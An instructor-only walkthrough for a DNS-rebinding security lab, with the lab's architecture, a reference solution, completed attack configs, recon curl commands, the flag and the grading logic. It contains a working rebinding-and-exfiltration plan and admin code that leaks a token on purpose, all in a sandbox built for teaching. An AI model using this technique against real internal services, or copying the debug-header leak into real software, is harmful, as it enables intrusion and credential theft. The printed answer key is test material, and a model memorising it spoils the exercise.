# Activity 3 &mdash; reference solution & deep-dive (instructor)

This walkthrough is **not** for students. The student-facing instructions in `activity_guide.md` deliberately omit the solution.

It documents (1) how the lab is wired end-to-end, (2) the reference solution, (3) the failure modes a student is likely to hit, and (4) how grading works after the simplification to flag-only.

---

## 1. System architecture

When `initactivity.sh` finishes, two Flask processes are running inside the container:

| Process | Bind | Role |
|---|---|---|
| `attacker_server.py` | `0.0.0.0:30000` | The "attacker page" the student opens at `http://localhost:30000`. Hosts the dashboard and the in-process **victim bot**. |
| `admin_server.py` | `127.0.0.1:8080` | Simulated internal admin. Loopback-only on purpose &mdash; from outside the container it's not reachable. |

The student also has a shell **inside** the container (the LMS terminal panel). That shell can reach `127.0.0.1:8080` directly &mdash; that's recon, not the attack.

```
   ┌──────── student's real browser (LMS proxy) ─────────┐
   │                                                       │
   │       http://localhost:30000   (dashboard, bot)      │
   │                                                       │
   └──────────────────┬───────────────────────────────────┘
                      │
              ┌───────▼────────┐         ┌─────────────────┐
              │ attacker_server │ ◀──────▶ in-process bot   │
              │  (port 30000)   │         │ (FakeDNS + SOP) │
              └─────────────────┘         └────────┬────────┘
                                                   │
                                          loopback HTTP
                                                   │
                                          ┌────────▼────────┐
                                          │  admin_server    │
                                          │  (127.0.0.1:8080)│
                                          └─────────────────┘
```

### The bot

`run_bot_once()` in `attacker_server.py` is what executes when the student clicks **Run Bot**. It:

1. Reads `dns_config.json` and `attack_plan.json` from `/home/labDirectory/` fresh on every run.
2. Builds a **stateful FakeDNS resolver** from the config. Each hostname maps to a sequence of `(ip, port)` answers; `resolve()` returns them in order and sticks at the last one. This is what gives the bot a "first answer, then a different answer" property &mdash; classic DNS rebinding.
3. Loads `page_url` and "navigates" to it (records the page origin's hostname).
4. Walks `victim_actions` in order. For `fetch` actions it enforces **Same-Origin Policy**: the action's URL hostname must match the page's hostname, otherwise the action is blocked and a `bot_sop_block` event is logged.
5. For `exfil` with `data: "$last_response"`, it uses the body of the previous fetch as the payload and writes a `bot_exfil` event.

Crucially, when the bot `requests.get`s through the resolver, it preserves the **original Host header** but connects to the resolver-supplied IP/port. That's the realistic browser behavior post-rebind: the browser thinks "still attacker.lab", but the TCP connection lands on a different server.

### The admin server (Activity 3 specifics)

```python
INTERNAL_TOKEN = "ops-2026"

@app.route("/api/v2/healthz")
def healthz():
    resp = make_response(jsonify({"status": "ok", "service": "corp-admin-v2"}))
    resp.headers["X-Internal-Token-Debug"] = INTERNAL_TOKEN   # the leak
    return resp

@app.route("/api/v2/secret")
def secret():
    if request.args.get("token") != INTERNAL_TOKEN:
        return jsonify({"error": "missing or wrong token"}), 403
    return jsonify({"corporate_secret": FLAG3, "issued_to": "internal-staff"})

@app.route("/api/v2/whoami")
def whoami():
    return jsonify({"trust_level": "internal", "service": "corp-admin-v2"})
```

Three things differ from Activity 2:

1. **Different URL surface.** `/admin/*` is gone; everything lives under `/api/v2/*`.
2. **Token-gated secret.** `/api/v2/secret` requires `?token=ops-2026`. Without it, 403.
3. **Token leaks in a debug response header.** `/api/v2/healthz` echoes `X-Internal-Token-Debug: ops-2026`. The lesson: production debug headers are a real, common credential leak.

---

## 2. Reference solution

### Recon (in the container terminal)

```bash
curl -i http://127.0.0.1:8080/api/v2/whoami
curl -i http://127.0.0.1:8080/api/v2/healthz   # <-- the leak is here
curl -i http://127.0.0.1:8080/api/v2/secret    # 403 without ?token=
```

`/api/v2/healthz` returns:

```
HTTP/1.1 200 OK
X-Internal-Token-Debug: ops-2026
...
{"status": "ok", "service": "corp-admin-v2"}
```

So the magic value is `ops-2026`. Quick sanity check:

```bash
curl http://127.0.0.1:8080/api/v2/secret?token=ops-2026
# {"corporate_secret": "IITB{labf_a3_independent_pwn_complete}", ...}
```

### Filling in the scaffold

The student starts from these `TODO-` skeletons (written by `initactivity.sh` on lab boot):

`dns_config.json` (initial state):
```json
{
  "hostnames": [
    {
      "hostname": "TODO-pick-any-hostname.lab",
      "initial_ip": "127.0.0.1",
      "initial_port": 30000,
      "rebind_ip": "TODO-fill-in",
      "rebind_port": 0,
      "rebind_after_request": 1
    }
  ]
}
```

`attack_plan.json` (initial state):
```json
{
  "page_url": "http://TODO-same-hostname-as-in-dns-config/payload",
  "victim_actions": [
    {
      "action": "fetch",
      "url": "http://TODO-same-hostname-as-in-dns-config/TODO-which-endpoint",
      "query": { "TODO-key": "TODO-value" }
    },
    { "action": "exfil", "data": "$last_response" }
  ]
}
```

### Reference completed configs

`dns_config.json`:
```json
{
  "hostnames": [
    {
      "hostname": "corp.local",
      "initial_ip": "127.0.0.1",
      "initial_port": 30000,
      "rebind_ip": "127.0.0.1",
      "rebind_port": 8080,
      "rebind_after_request": 1
    }
  ]
}
```

`attack_plan.json`:
```json
{
  "page_url": "http://corp.local/payload",
  "victim_actions": [
    {
      "action": "fetch",
      "url": "http://corp.local/api/v2/secret",
      "query": { "token": "ops-2026" }
    },
    { "action": "exfil", "data": "$last_response" }
  ]
}
```

Mapping each `TODO-` to its replacement:

| Placeholder | Reference value | Where the student finds it |
|---|---|---|
| `TODO-pick-any-hostname.lab` | `corp.local` (any string works) | Free choice; must match across both files. |
| `rebind_ip: TODO-fill-in` | `127.0.0.1` | Recon: admin server binds to loopback. |
| `rebind_port: 0` | `8080` | Recon: visible from `ss -ltn` or any successful curl. |
| `TODO-which-endpoint` | `api/v2/secret` | Recon: `/api/v2/whoami` & `/api/v2/healthz` are diversions; the secret is at `/api/v2/secret`. |
| `TODO-key` | `token` | Recon: `/api/v2/secret` 403 hint says "expects `?token=`"; healthz header name is `X-Internal-Token-Debug`. |
| `TODO-value` | `ops-2026` | Recon: leaked verbatim by `/api/v2/healthz`. |

### Running the bot

After saving both files, the student clicks **Run Bot** on the dashboard. The events that should appear, in order:

1. `bot_load_page` &mdash; bot fetched `http://corp.local/payload`. FakeDNS returned the *initial* answer (`127.0.0.1:30000`), which is the attacker server itself; the page returns the harmless attacker-origin marker. This consumes the first DNS lookup for `corp.local`.
2. `bot_fetch` &mdash; bot fetched `http://corp.local/api/v2/secret?token=ops-2026`. FakeDNS now returns the *rebound* answer (`127.0.0.1:8080`); the request hits the admin server with `Host: corp.local` and `?token=ops-2026`. Status `200`, body contains `IITB{labf_a3_independent_pwn_complete}`.
3. `bot_exfil` &mdash; the `$last_response` substitution copies the body of the previous fetch into the exfil event payload. This is what would, in a real attack, leave the victim's machine.

The student copies `IITB{labf_a3_independent_pwn_complete}` from the dashboard event log into `flag.txt` and clicks **Evaluate**.

---

## 3. Why the technique works (pedagogy)

The whole exploit relies on two facts:

1. **Same-Origin Policy is enforced on origin name, not IP.** A browser (and therefore the bot) treats `corp.local` as one origin regardless of which IP it currently resolves to. So once the page from `http://corp.local/payload` is loaded, follow-up fetches to `http://corp.local/api/v2/secret` are **same-origin** and pass SOP &mdash; even if the underlying TCP connection now lands on a totally different machine.
2. **DNS answers are not contractual.** The first lookup of `corp.local` returns the attacker IP (so the page loads). The second lookup returns the internal IP (so subsequent fetches reach the internal target). Real-world TTL-1 DNS makes this trivially cheap.

The lab's `FakeDNS.resolve()` simulates exactly this in-process &mdash; no actual DNS server is involved. `rebind_after_request: 1` means "answer 1 lookup with the initial pair, then return the rebind pair forever after."

The bot also preserves the `Host` header on the post-rebind request:

```python
resp = requests.get(target_url, headers={"Host": host}, timeout=4)
```

This matches what a real browser does: the connection's destination IP changed, but the HTTP `Host` header still says what the URL bar says. That's a subtle but important pedagogical detail &mdash; some real internal services route on Host header alone, which can either help or hurt the attacker depending on configuration.

---

## 4. Common student failure modes

| Symptom | Likely cause |
|---|---|
| `bot_sop_block` event | `attack_plan.json` `url` hostname doesn't match `page_url` hostname. Both must be the chosen hostname (`corp.local` in the reference). |
| 403 in `bot_fetch` body | Token wrong or missing. Check the `query` object in `attack_plan.json`. |
| 200 but wrong body / no flag | Bot hit the attacker server, not the admin. Likely `rebind_ip`/`rebind_port` still at placeholder values (`TODO-fill-in` / `0`), or `rebind_after_request` set to `0` (resolver returns rebind on every lookup, including the page load &mdash; the page itself becomes the admin server, which has no `/payload` route). |
| `DNS lookup failed for '...'` | Hostname in `attack_plan.json` doesn't appear in `dns_config.json`. |
| Configs show `_error: Invalid JSON` on the dashboard | Trailing comma, missing quote, etc. The dashboard surfaces the `json.JSONDecodeError` directly. |

---

## 5. Direct-curl bypass

A student with a container shell can run:

```bash
curl http://127.0.0.1:8080/api/v2/secret?token=ops-2026
```

and obtain the flag string without ever using the bot. **This is currently not blocked.** Grading is flag-only, so a student who does this will pass the autograder. The intended pedagogy assumes the student role-plays the attacker (whose only access is the browser). If you need to lock this down later, the cleanest fix is to have `admin_server.py` return an opaque non-flag blob, and have `attacker_server.py` substitute the real flag into the dashboard only when the bot successfully exfiltrates that blob &mdash; design notes are in repo history.

---

## 6. Grading

`autograder.py` runs a single test:

```python
EXPECTED_FLAG = "IITB{labf_a3_independent_pwn_complete}"
# test 1: flag.txt content stripped == EXPECTED_FLAG -> 100 / 100
# anything else -> 0 / 100
```

There is no longer a bot-event check. If the student gets the flag string into `flag.txt` by any means (correct rebind, direct curl, copy-pasting from this walkthrough), they get full marks. This is intentional after the Activity 3 simplification.

---

## 7. Lessons reinforced

- **Same technique, different surface.** The student should observe that the rebinding pattern is generic; the only per-target work is enumeration.
- **Tokens leaked in debug headers** are a common real-world finding. Many internal services ship with these.
- **Hostname is arbitrary.** Activity 3 uses `corp.local` to make explicit that the hostname is just a label the bot looks up; it has no relationship to any real DNS.
- **Schema scaffolding lowers the floor without lowering the ceiling.** The student is told *what* fields exist, not *which values* to put in them. The 6 `TODO-` slots map 1:1 to 6 things they have to learn from recon.

---

## 8. Packaging note

If you want to keep this file out of the student tarball, the included `prepup.sh` already excludes it via `--exclude='WALKTHROUGH.md'` -- adjust per your policy.
